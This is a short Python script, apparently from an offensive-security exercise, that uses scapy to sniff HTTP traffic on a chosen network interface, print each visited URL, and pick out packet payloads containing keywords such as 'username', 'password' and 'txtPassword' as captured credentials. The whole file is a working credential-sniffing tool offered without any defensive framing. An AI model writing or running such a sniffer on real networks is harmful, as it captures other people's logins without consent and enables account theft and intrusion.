
import scapy.all as scapy
from scapy.layers import http
import argparse

from colorama import Fore,Style

def get_args():
    parser =  argparse.ArgumentParser()
    parser.add_argument("-i", "--iface", dest="interface", help="Interface of the target.")
    arg = parser.parse_args()
    if not arg.interface:
        print("[+] Please specify an IP Address of the target machine,use --hlep for more infor ")
    return arg

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
def get_login_infor(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["txtUserName", "txtPassword", "User", "Pass", "username", "password", "user","uname","pass"]
        for keyword in keywords:
            if keyword in load:
                return load
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + str(url))
        login_info=get_login_infor(packet)
        if login_info:
             print("\n[+] Possible username/password >> " + Fore.GREEN +  str(login_info)  + Style.RESET_ALL +  "\n")

def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet)
arg = get_args()
sniff(arg.interface)